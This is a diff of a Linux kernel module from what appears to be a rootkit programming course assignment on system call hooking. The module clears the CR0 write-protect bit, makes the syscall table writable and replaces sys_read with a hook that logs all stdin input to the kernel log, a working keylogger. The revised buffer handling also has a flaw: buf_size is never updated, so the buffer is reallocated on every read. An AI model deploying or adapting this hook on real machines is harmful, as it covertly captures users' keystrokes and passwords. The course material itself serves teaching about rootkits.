@@ -21,13 +21,12 @@
 #include <linux/string.h>
 #include "sysmap.h"
 
-#define DRIVER_AUTHOR "Rootkit Programming"
+#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
 #define DRIVER_DESC   "Assigment 2 - System Call Hooking"
-#define BUF_SIZE 1024
 
 void ** syscall_table = (void * *) sys_call_table_R;
 ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
-static char charbuf[BUF_SIZE]; //1k ought to be enough for everyone
+char * buffer;
 
 static void print_nr_procs2(void)
 {
@@ -41,7 +40,7 @@ static void print_nr_procs2(void)
 	printk(KERN_INFO "Number of current running processes (traversing scheduler linked list): %d\n", i);
 }
 
-static void print_nr_procs()
+static void print_nr_procs(void)
 {
   // cast system symbol adress to function pointer
   int a = ((int (*)(void))nr_processes_T)();
@@ -49,20 +48,23 @@ static void print_nr_procs()
 }
 
 static ssize_t my_read(int fd, void *buf, size_t count){
+	static int buf_size = 0;
 	ssize_t retVal;
-	int i;
 	retVal = orig_sys_read(fd, buf, count);
 	if(fd == 0){ //stdin
-		/*for(i=0;i<count;i++){
-			printk(KERN_INFO "%c", ((char *)buf)[i]);
-		}*/
-		i = (count>BUF_SIZE)?BUF_SIZE:count;
-		strncpy(charbuf, (char*)buf, i);
-		charbuf[i]='\0';
-		printk(KERN_INFO "%s\n",charbuf);
+		if(count >= buf_size){
+			kfree(buffer);
+			buffer = (char *) kmalloc(count+1, GFP_KERNEL);
+		}
+		if(buffer != NULL){
+			strncpy(buffer, (char*)buf, count);
+			buffer[count]='\0';
+			printk(KERN_INFO "%s\n",buffer);
+		}
 	}
 	return retVal;
 }
+
 
 static int __init mod_init(void)
 {
@@ -74,12 +76,13 @@ static int __init mod_init(void)
   printk(KERN_INFO "Welcome!\n");
   printk(KERN_INFO "Read address: %p", syscall_table[0]);
   
+  //Disable write protection in the cpu
   cr0 = read_cr0();
-  write_cr0(cr0 & ~0x00010000);
-
-  
+  write_cr0(cr0 & ~0x00010000); //Bit 16 is the write protection bit
+ 
 
   addr = (unsigned long) syscall_table;
+  //Set the memory of addr's page and the next two pages as writable
   ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
   if(ret){
 	printk(KERN_INFO "Cannot set memory to rw\n");
@@ -103,6 +106,7 @@ static void __exit mod_exit(void)
   write_cr0(cr0 & ~0x00010000);
   syscall_table[__NR_read] = orig_sys_read;
   write_cr0(cr0);
+  kfree(buffer);
   printk(KERN_INFO "Goodbye!\n");
 }
 
